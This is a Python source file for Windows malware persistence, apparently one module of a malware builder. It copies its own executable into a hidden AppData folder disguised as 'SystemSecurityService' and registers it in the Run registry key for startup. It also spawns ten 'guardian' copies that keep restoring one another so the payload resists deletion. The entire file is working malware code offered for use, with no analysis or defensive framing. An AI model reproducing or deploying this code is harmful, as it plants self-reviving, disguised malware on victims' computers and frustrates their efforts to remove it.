import os
import sys
import subprocess
import winreg
import time
import shutil

# --- CONFIGURATION ---
PAYLOAD_NAME = "payload_main.exe" # The builder will replace this
GUARDIAN_PREFIX = "guard_"
NUM_GUARDIANS = 10
INSTALL_DIR = os.path.join(os.getenv("APPDATA"), "SystemSecurity")
REG_KEY = r"SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
REG_NAME = "SystemSecurityService"
LOCK_FILE = os.path.join(INSTALL_DIR, "revive.lock")

def add_to_startup(executable_path):
    """Adds the executable to the Windows startup registry."""
    try:
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, REG_KEY, 0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(key, REG_NAME, 0, winreg.REG_SZ, f'"{executable_path}"')
        winreg.CloseKey(key)
        return True
    except WindowsError:
        return False

def create_guardians(main_payload_path):
    """Creates guardian files that monitor and revive the main payload."""
    for i in range(NUM_GUARDIANS):
        guardian_path = os.path.join(INSTALL_DIR, f"{GUARDIAN_PREFIX}{i}.exe")
        shutil.copy2(main_payload_path, guardian_path)

def manage_resilience():
    """Main function to setup and maintain resilience."""
    time.sleep(2) # Give a moment for the initial execution to settle
    
    # Determine if this instance is a guardian or the main payload
    current_exe = os.path.basename(sys.executable)
    is_guardian = current_exe.startswith(GUARDIAN_PREFIX)
    main_payload_path = os.path.join(INSTALL_DIR, PAYLOAD_NAME)

    # --- INITIAL SETUP ---
    if not os.path.exists(INSTALL_DIR):
        os.makedirs(INSTALL_DIR)
        shutil.copy2(sys.executable, main_payload_path)
        add_to_startup(main_payload_path)
        create_guardians(main_payload_path)

    # --- RESILIENCE LOOP ---
    while True:
        if is_guardian:
            # Guardian's job: Check if the main payload exists.
            if not os.path.exists(main_payload_path):
                # Try to acquire a lock before reviving
                if not os.path.exists(LOCK_FILE):
                    try:
                        open(LOCK_FILE, 'w').close() # Create lock file
                        shutil.copy2(sys.executable, main_payload_path)
                        os.remove(LOCK_FILE) # Release lock
                    except Exception:
                        pass # Another guardian was faster
        else:
            # Main payload's job: Check if guardians exist.
            for i in range(NUM_GUARDIANS):
                guardian_path = os.path.join(INSTALL_DIR, f"{GUARDIAN_PREFIX}{i}.exe")
                if not os.path.exists(guardian_path):
                    shutil.copy2(main_payload_path, guardian_path)
        
        time.sleep(10) # Check every 10 seconds